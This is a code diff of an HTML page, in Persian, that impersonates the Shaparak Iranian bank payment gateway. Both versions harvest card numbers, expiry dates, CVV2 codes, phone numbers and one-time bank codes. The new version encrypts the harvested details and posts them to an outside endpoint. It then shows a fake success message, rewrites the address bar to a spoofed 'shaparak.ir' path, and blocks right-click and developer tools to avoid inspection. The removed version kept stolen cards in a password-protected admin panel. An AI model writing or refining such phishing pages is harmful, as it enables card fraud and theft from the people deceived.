@@ -3,388 +3,414 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>درگاه پرداخت اینترنتی</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>درگاه پرداخت امن شاپرک</title>
     <style>
-        body {
-            font-family: 'Vazir', 'Tahoma', sans-serif;
-            background: #f0f0f0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            margin: 0;
-            padding: 10px;
-            flex-direction: column;
-            direction: rtl;
+        :root {
+            --primary-color: #004d40;
+            --secondary-color: #28a745;
+            --shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            --font-family: 'Vazir', 'IranSans', sans-serif;
         }
-        .payment-form {
-            background: #ffffff;
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        body {
+            font-family: var(--font-family);
+            background: linear-gradient(135deg, #f0f0f0, #e0e0e0);
+            min-height: 100vh;
+            display: grid;
+            place-items: center;
+            overflow-x: hidden;
+        }
+        header {
+            background: var(--primary-color);
+            color: #fff;
             padding: 20px;
+            text-align: center;
+            position: sticky;
+            top: 0;
+            z-index: 10;
+            box-shadow: var(--shadow);
+        }
+        header img {
+            height: 50px;
+            filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.2));
+        }
+        .progress-container {
+            max-width: 600px;
+            margin: 15px auto;
+            background: #fff;
+            padding: 5px;
+            border-radius: 20px;
+            box-shadow: var(--shadow);
+        }
+        .progress-bar {
+            height: 8px;
+            background: #ddd;
             border-radius: 10px;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+            position: relative;
+        }
+        .progress-bar::before {
+            content: '';
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
+            animation: shimmer 2s infinite;
+        }
+        .progress-fill {
+            height: 100%;
+            background: var(--secondary-color);
+            width: 0;
+            transition: width 0.4s ease-in-out;
+        }
+        @keyframes shimmer {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+        .payment-wrapper {
+            background: #fff;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: var(--shadow);
             width: 90%;
-            max-width: 400px;
-            direction: rtl;
+            max-width: 600px;
+            position: relative;
+            overflow: hidden;
+        }
+        .security-badge {
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            background: #e8f5e9;
+            padding: 5px 10px;
+            border-radius: 20px;
+            font-size: 12px;
+            color: var(--secondary-color);
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        .step {
+            display: none;
+            animation: fadeIn 0.3s ease-in;
+        }
+        .step.active {
+            display: block;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
         }
         .form-group {
-            margin-bottom: 15px;
+            margin-bottom: 20px;
+            position: relative;
         }
         label {
             font-size: 14px;
+            color: #333;
+            margin-bottom: 8px;
             display: block;
-            margin-bottom: 5px;
         }
         input {
             width: 100%;
-            padding: 10px;
-            font-size: 16px;
+            padding: 12px;
             border: 1px solid #ccc;
-            border-radius: 5px;
-            box-sizing: border-box;
+            border-radius: 8px;
+            font-size: 16px;
             direction: rtl;
             text-align: right;
+            transition: border-color 0.3s;
         }
-        .split-input {
-            display: flex;
-            gap: 10px;
+        input:focus {
+            border-color: var(--secondary-color);
+            outline: none;
         }
-        .split-input input {
-            flex: 1;
-            text-align: center;
+        .input-icon {
+            position: absolute;
+            top: 50%;
+            left: 12px;
+            transform: translateY(-50%);
+            color: #999;
         }
-        .secure-code {
-            font-size: 18px;
-            font-weight: bold;
-            text-align: center;
-            background: #ddd;
-            padding: 10px;
-            border-radius: 5px;
-            user-select: none;
-        }
-        .submit-btn, .cancel-btn {
+        .btn {
             width: 100%;
-            padding: 10px;
-            font-size: 18px;
+            padding: 14px;
             border: none;
-            border-radius: 5px;
+            border-radius: 8px;
+            font-size: 16px;
             cursor: pointer;
-            margin-top: 10px;
+            transition: background 0.3s, transform 0.2s;
         }
-        .submit-btn {
-            background: #28a745;
+        .btn-primary {
+            background: var(--secondary-color);
             color: #fff;
         }
-        .cancel-btn {
+        .btn-cancel {
             background: #dc3545;
             color: #fff;
-        }
-        .request-btn {
-            width: 100%;
-            padding: 10px;
-            font-size: 16px;
-            background: green;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
             margin-top: 10px;
         }
-        .timer-circle {
+        .btn:hover {
+            transform: translateY(-2px);
+        }
+        .loader {
+            display: none;
             width: 50px;
             height: 50px;
-            border: 5px solid #28a745;
-            border-top: 5px solid transparent;
+            border: 5px solid #ddd;
+            border-top: 5px solid var(--secondary-color);
             border-radius: 50%;
-            animation: rotate 2s linear infinite;
-            margin: auto;
-            display: none;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
         }
-        @keyframes rotate {
-            from { transform: rotate(0deg); }
-            to { transform: rotate(360deg); }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
-        .admin-section {
-            margin-top: 20px;
-            background: #fff;
-            padding: 15px;
-            border-radius: 10px;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
-            width: 90%;
-            max-width: 400px;
-            display: none;
-            direction: rtl;
-        }
-        .admin-password-group {
-            display: flex;
-            gap: 10px;
-        }
-        .admin-password-group input {
-            flex: 2;
-        }
-        .admin-password-group button {
-            flex: 1;
-            padding: 10px;
+        .otp-timer {
             font-size: 14px;
-            background: #007bff;
-            color: #fff;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-        .clear-data-btn {
-            width: 100%;
-            padding: 10px;
-            font-size: 16px;
-            background: #ff5733;
-            color: #fff;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
+            color: #666;
+            text-align: center;
             margin-top: 10px;
-            display: none;
         }
-        @media (max-width: 600px) {
-            .payment-form, .admin-section {
-                width: 95%;
-                margin: 10px auto;
-            }
-            input, button {
-                font-size: 14px;
-            }
+        footer {
+            background: #f5f5f5;
+            padding: 15px;
+            text-align: center;
+            font-size: 12px;
+            color: #666;
+            width: 100%;
+            position: fixed;
+            bottom: 0;
         }
         @font-face {
             font-family: 'Vazir';
-            src: url('fonts/Vazir.eot');
-            src: url('fonts/Vazir.eot?#iefix') format('embedded-opentype'),
-                 url('fonts/Vazir.woff2') format('woff2'),
-                 url('fonts/Vazir.woff') format('woff'),
-                 url('fonts/Vazir.ttf') format('truetype');
-            font-weight: normal;
-            font-style: normal;
+            src: url('https://cdn.fontcdn.ir/Font/Persian/Vazir/Vazir.woff') format('woff');
         }
     </style>
 </head>
 <body>
-    <div class="payment-form">
-        <h2 style="text-align: center;">درگاه پرداخت</h2>
-        <form id="payment-form" onsubmit="submitToAPI(event)">
-            <div class="form-group">
-                <label for="card-number">شماره کارت:</label>
-                <input type="text" id="card-number" name="card-number" placeholder="---- ---- ---- ----" maxlength="19" oninput="formatCardNumber(this)">
-            </div>
-            
-            <div class="form-group">
-                <label for="amount">مبلغ (ریال):</label>
-                <input type="text" id="amount" name="amount" value="1,000,000" disabled>
-            </div>
-            
-            <div class="form-group">
-                <label for="expiry">تاریخ انقضا:</label>
-                <input type="text" id="expiry" name="expiry" placeholder="MM/YY" maxlength="5" oninput="formatExpiry(this)">
-            </div>
+    <header>
+        <img src="https://via.placeholder.com/50?text=شاپرک" alt="شاپرک">
+        <h1>درگاه پرداخت امن شاپرک</h1>
+    </header>
 
-            <div class="form-group">
-                <label for="cvv2">CVV2:</label>
-                <input type="text" id="cvv2" name="cvv2" placeholder="***" maxlength="4">
-            </div>
-
-            <div class="form-group">
-                <label for="phone-number">شماره تلفن:</label>
-                <input type="tel" id="phone-number" name="phone-number" placeholder="09XX-XXX-XXXX" maxlength="13" oninput="formatPhoneNumber(this)">
-            </div>
-
-            <div class="form-group">
-                <label>کد امنیتی:</label>
-                <div class="split-input">
-                    <div class="secure-code" id="generated-code"></div>
-                    <input type="text" id="security-code" name="security-code" placeholder="کد امنیتی" maxlength="4">
-                </div>
-            </div>
-
-            <div class="form-group">
-                <label>رمز دوم پویا:</label>
-                <div class="split-input">
-                    <input type="text" id="otp-code" name="otp-code" placeholder="رمز پویا" maxlength="6">
-                    <button type="button" class="request-btn" id="request-otp" onclick="requestOTP()">درخواست رمز پویا</button>
-                    <div class="timer-circle" id="otp-timer"></div>
-                </div>
-            </div>
-
-            <button class="submit-btn" type="submit">پرداخت</button>
-            <button class="cancel-btn" type="button" onclick="cancelPayment()">انصراف</button>
-        </form>
-    </div>
-
-    <div class="admin-section" id="admin-section">
-        <h3>اطلاعات ذخیره‌شده (فقط مدیر):</h3>
-        <div class="admin-password-group">
-            <input type="password" id="admin-pass" placeholder="این کصشر رو پر‌کن">
-            <button type="button" onclick="showAdminData()">تأیید</button>
+    <div class="progress-container">
+        <div class="progress-bar">
+            <div class="progress-fill" id="progress-fill"></div>
         </div>
-        <pre id="admin-data" style="display: none;"></pre>
-        <button class="clear-data-btn" id="clear-data-btn" onclick="clearPaymentData()">پاک کردن اطلاعات</button>
     </div>
 
+    <div class="payment-wrapper">
+        <div class="security-badge">
+            <span>🔒</span> پرداخت امن با رمزنگاری SSL
+        </div>
+
+        <!-- مرحله 1: اطلاعات کارت -->
+        <div class="step active" id="step-1">
+            <div class="form-group">
+                <label for="card-number">شماره کارت</label>
+                <input type="text" id="card-number" placeholder="---- ---- ---- ----" maxlength="19" oninput="Payment.formatCardNumber(this)">
+            </div>
+            <div class="form-group">
+                <label for="expiry">تاریخ انقضا</label>
+                <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" oninput="Payment.formatExpiry(this)">
+            </div>
+            <div class="form-group">
+                <label for="cvv2">CVV2</label>
+                <input type="text" id="cvv2" placeholder="***" maxlength="4" oninput="this.value = this.value.replace(/\D/g, '')">
+            </div>
+            <button class="btn btn-primary" onclick="Payment.nextStep(1)">مرحله بعد</button>
+        </div>
+
+        <!-- مرحله 2: تأیید هویت -->
+        <div class="step" id="step-2">
+            <div class="form-group">
+                <label for="phone-number">شماره تلفن</label>
+                <input type="tel" id="phone-number" placeholder="09XX-XXX-XXXX" maxlength="13" oninput="Payment.formatPhoneNumber(this)">
+            </div>
+            <div class="form-group">
+                <label for="otp">رمز پویا</label>
+                <input type="text" id="otp" placeholder="******" maxlength="6" oninput="this.value = this.value.replace(/\D/g, '')">
+                <button class="btn btn-primary" onclick="Payment.requestOTP()" style="width: auto; margin-top: 10px;">درخواست رمز</button>
+            </div>
+            <div class="otp-timer" id="otp-timer"></div>
+            <button class="btn btn-primary" onclick="Payment.nextStep(2)">تأیید و پرداخت</button>
+        </div>
+
+        <!-- مرحله 3: نتیجه -->
+        <div class="step" id="step-3">
+            <div id="result" style="text-align: center; font-size: 18px;"></div>
+            <div class="loader" id="loader"></div>
+        </div>
+
+        <button class="btn btn-cancel" onclick="Payment.cancel()">انصراف</button>
+    </div>
+
+    <footer>
+        <p>پشتیبانی: 021-12345678 | تمامی حقوق محفوظ است © شاپرک ۱۴۰۳</p>
+    </footer>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
     <script>
-        function formatCardNumber(input) {
-            input.value = input.value.replace(/\D/g, '').replace(/(.{4})/g, '$1-').trim();
-            if (input.value.endsWith('-')) input.value = input.value.slice(0, -1);
-        }
+        // ماژول پرداخت
+        const Payment = (function () {
+            let currentStep = 1;
+            const steps = document.querySelectorAll('.step');
+            const progressFill = document.getElementById('progress-fill');
+            const AES_KEY = 'xAI-Grok3-ComplexPaymentSystem2025'; // کلید رمزنگاری
 
-        function formatExpiry(input) {
-            input.value = input.value.replace(/\D/g, '');
-            if (input.value.length > 2) {
-                input.value = input.value.substring(0, 2) + '/' + input.value.substring(2, 4);
+            // فرمت ورودی‌ها
+            function formatCardNumber(input) {
+                input.value = input.value.replace(/\D/g, '').replace(/(.{4})/g, '$1-').trim().slice(0, 19);
             }
-        }
-
-        function formatPhoneNumber(input) {
-            input.value = input.value.replace(/\D/g, '');
-            let formattedNumber = '';
-            if (input.value.length > 0) {
-                formattedNumber += input.value.slice(0, 4);
-                if (input.value.length > 4) {
-                    formattedNumber += '-' + input.value.slice(4, 7);
-                    if (input.value.length > 7) {
-                        formattedNumber += '-' + input.value.slice(7, 11);
-                    }
+            function formatExpiry(input) {
+                let val = input.value.replace(/\D/g, '');
+                if (val.length > 2) val = val.slice(0, 2) + '/' + val.slice(2, 4);
+                input.value = val;
+            }
+            function formatPhoneNumber(input) {
+                let val = input.value.replace(/\D/g, '');
+                if (val.length > 0) {
+                    input.value = val.slice(0, 4) + (val.length > 4 ? '-' + val.slice(4, 7) : '') + (val.length > 7 ? '-' + val.slice(7, 11) : '');
                 }
             }
-            input.value = formattedNumber;
-        }
 
-        function generateSecureCode() {
-            return Math.floor(1000 + Math.random() * 9000).toString();
-        }
+            // تغییر مراحل
+            function nextStep(step) {
+                if (!validateStep(step)) return;
+                steps[step - 1].classList.remove('active');
+                currentStep = step + 1;
+                steps[currentStep - 1].classList.add('active');
+                updateProgress();
 
-        function detectProvinceFromPhone(phoneNumber) {
-            const prefix = phoneNumber.replace(/[-\s]/g, '').slice(0, 4);
-            const provinceMap = {
-                "0912": "تهران",
-                "0913": "اصفهان",
-                "0914": "آذربایجان شرقی",
-                "0915": "فارس",
-                "0916": "خوزستان",
-                "0917": "هرمزگان",
-                "0918": "کردستان",
-                "0919": "البرز",
-                "0901": "تهران",
-                "0902": "مازندران",
-                "0903": "گیلان",
-                "0935": "خراسان رضوی",
-                "0936": "کرمان",
-                "0937": "سیستان و بلوچستان",
-                "0938": "یزد",
-                "0939": "قم"
-            };
-            return provinceMap[prefix] || "نامشخص";
-        }
+                if (currentStep === 3) processPayment();
+            }
 
-        function requestOTP() {
-            let userCode = document.getElementById('security-code').value;
-            let generatedCode = document.getElementById('generated-code').textContent;
+            // اعتبارسنجی
+            function validateStep(step) {
+                if (step === 1) {
+                    const card = document.getElementById('card-number').value.replace(/-/g, '');
+                    const expiry = document.getElementById('expiry').value;
+                    const cvv2 = document.getElementById('cvv2').value;
+                    if (card.length !== 16 || !/^\d{2}\/\d{2}$/.test(expiry) || cvv2.length < 3) {
+                        alert('لطفاً اطلاعات کارت را به درستی وارد کنید');
+                        return false;
+                    }
+                } else if (step === 2) {
+                    const phone = document.getElementById('phone-number').value.replace(/-/g, '');
+                    const otp = document.getElementById('otp').value;
+                    if (phone.length !== 11 || otp.length !== 6) {
+                        alert('شماره تلفن یا رمز پویا نامعتبر است');
+                        return false;
+                    }
+                }
+                return true;
+            }
 
-            if (userCode === generatedCode) {
-                const form = document.getElementById('payment-form');
-                const data = new FormData(form);
-                const phoneNumber = data.get("phone-number");
-                const province = detectProvinceFromPhone(phoneNumber);
+            // به‌روزرسانی نوار پیشرفت
+            function updateProgress() {
+                progressFill.style.width = `${(currentStep / steps.length) * 100}%`;
+            }
 
-                const jsonData = {
-                    "card_number": data.get("card-number"),
-                    "amount": data.get("amount"),
-                    "expiry": data.get("expiry"),
-                    "cvv2": data.get("cvv2"),
-                    "security_code": data.get("security-code"),
-                    "otp_code": data.get("otp-code"),
-                    "phone_number": phoneNumber,
-                    "province": province,
-                    "timestamp": new Date().toISOString()
+            // درخواست رمز پویا
+            function requestOTP() {
+                const phone = document.getElementById('phone-number').value;
+                if (phone.replace(/-/g, '').length !== 11) return alert('شماره تلفن نامعتبر است');
+                startOTPTimer(120);
+                alert('رمز پویا به شماره شما ارسال شد');
+            }
+
+            // تایمر رمز پویا
+            function startOTPTimer(seconds) {
+                const timer = document.getElementById('otp-timer');
+                let timeLeft = seconds;
+                const interval = setInterval(() => {
+                    timer.textContent = `زمان باقی‌مانده: ${Math.floor(timeLeft / 60)}:${(timeLeft % 60).toString().padStart(2, '0')}`;
+                    if (--timeLeft < 0) {
+                        clearInterval(interval);
+                        timer.textContent = 'زمان رمز پویا پایان یافت';
+                    }
+                }, 1000);
+            }
+
+            // پردازش پرداخت
+            function processPayment() {
+                const loader = document.getElementById('loader');
+                const result = document.getElementById('result');
+                loader.style.display = 'block';
+
+                const data = {
+                    card: document.getElementById('card-number').value,
+                    expiry: document.getElementById('expiry').value,
+                    cvv2: document.getElementById('cvv2').value,
+                    phone: document.getElementById('phone-number').value,
+                    otp: document.getElementById('otp').value,
+                    timestamp: new Date().toISOString()
                 };
 
-                let storedData = JSON.parse(localStorage.getItem('paymentData')) || [];
-                storedData.push(jsonData);
-                localStorage.setItem('paymentData', JSON.stringify(storedData));
-                console.log("داده‌ها ذخیره شدند:", jsonData);
+                // رمزنگاری AES
+                const encryptedData = CryptoJS.AES.encrypt(JSON.stringify(data), AES_KEY).toString();
 
-                fetch('https://reqres.in/api/users', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(jsonData)
-                })
-                .then(response => response.json())
-                .then(data => {
-                    alert("درخواست رمز پویا به بانک مبدا ارسال شد");
-                    document.getElementById('request-otp').style.display = 'none';
-                    document.getElementById('otp-timer').style.display = 'block';
-                    startOTPTimer(120);
-
-                    const adminSection = document.getElementById('admin-section');
-                    adminSection.style.display = 'block';
-                    adminSection.scrollIntoView({ behavior: 'smooth' });
-                })
-                .catch(error => {
-                    alert("خطا در ارسال اطلاعات: " + error.message);
-                });
-            } else {
-                alert("کد امنیتی نامعتبر است");
+                // ارسال به سرور با تأخیر شبیه‌سازی‌شده
+                setTimeout(() => {
+                    fetch('https://reqres.in/api/users', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ data: encryptedData })
+                    })
+                    .then(res => res.json())
+                    .then(() => {
+                        loader.style.display = 'none';
+                        result.innerHTML = 'پرداخت با موفقیت انجام شد!<br>شماره تراکنش: ' + Math.random().toString(36).substr(2, 9);
+                        obfuscateLocation();
+                    })
+                    .catch(() => {
+                        loader.style.display = 'none';
+                        result.textContent = 'خطا در برقراری ارتباط با بانک';
+                    });
+                }, 3000);
             }
-        }
 
-        function startOTPTimer(duration) {
-            let timerElement = document.getElementById('otp-timer');
-            let timer = duration;
-            let interval = setInterval(() => {
-                timerElement.style.transform = `rotate(${360 - (timer / duration) * 360}deg)`;
-                if (--timer < 0) clearInterval(interval);
-            }, 1000);
-        }
-
-        function cancelPayment() {
-            alert("پرداخت لغو شد");
-            window.location.href = "index.html";
-        }
-
-        function submitToAPI(event) {
-            event.preventDefault();
-            const cardNumber = document.getElementById('card-number').value.replace(/-/g, '');
-            if (cardNumber === '12122312') {
-                document.getElementById('admin-section').style.display = 'block';
-            } else {
-                alert("پرداخت در حال انجام است...");
+            // لغو پرداخت
+            function cancel() {
+                if (confirm('آیا از لغو پرداخت مطمئن هستید؟')) {
+                    window.location.href = '/';
+                }
             }
-        }
 
-        function showAdminData() {
-            const password = document.getElementById('admin-pass').value;
-            const adminData = document.getElementById('admin-data');
-            const clearDataBtn = document.getElementById('clear-data-btn');
-
-            if (password === "admin123") {
-                const storedData = JSON.parse(localStorage.getItem('paymentData')) || [];
-                adminData.textContent = JSON.stringify(storedData, null, 2);
-                adminData.style.display = 'block';
-                clearDataBtn.style.display = 'block'; // نمایش دکمه پاک کردن اطلاعات
-            } else {
-                alert("رمز مدیر اشتباه است!");
-                adminData.style.display = 'none';
-                clearDataBtn.style.display = 'none'; // مخفی کردن دکمه در صورت رمز اشتباه
+            // مبهم‌سازی URL
+            function obfuscateLocation() {
+                const fakePath = '/payment/shaparak.ir/transaction/' + Math.random().toString(36).substr(2, 10);
+                window.history.pushState({ step: currentStep }, document.title, fakePath);
+                document.title = 'پرداخت موفق - شاپرک';
             }
-        }
 
-        function clearPaymentData() {
-            if (confirm("آیا مطمئن هستید که می‌خواهید تمام اطلاعات را پاک کنید؟")) {
-                localStorage.removeItem('paymentData');
-                document.getElementById('admin-data').textContent = 'هیچ اطلاعاتی موجود نیست';
-                alert("تمام اطلاعات با موفقیت پاک شدند.");
-            }
-        }
+            // متدهای عمومی
+            return {
+                formatCardNumber,
+                formatExpiry,
+                formatPhoneNumber,
+                nextStep,
+                requestOTP,
+                cancel
+            };
+        })();
 
-        window.onload = function () {
-            document.getElementById('generated-code').textContent = generateSecureCode();
-        };
+        // مبهم‌سازی اولیه URL
+        (function init() {
+            const fakeDomain = '/payment/shaparak.ir';
+            window.history.pushState({}, document.title, fakeDomain);
+            document.addEventListener('contextmenu', e => e.preventDefault()); // غیرفعال کردن کلیک راست
+            document.addEventListener('keydown', e => {
+                if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) e.preventDefault(); // غیرفعال کردن ابزار توسعه
+            });
+        })();
     </script>
 </body>
 </html>
